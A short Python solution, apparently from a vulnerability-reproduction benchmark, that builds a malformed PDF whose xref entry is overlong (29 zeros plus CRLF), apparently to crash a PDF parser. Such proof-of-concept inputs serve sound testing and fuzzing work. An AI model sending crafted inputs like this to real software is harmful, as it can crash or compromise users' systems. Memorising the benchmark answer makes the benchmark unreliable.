class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b'%PDF-1.0\nxref\n0 1\n'
        entry = b'0' * 29 + b'\r\n'
        return prefix + entry
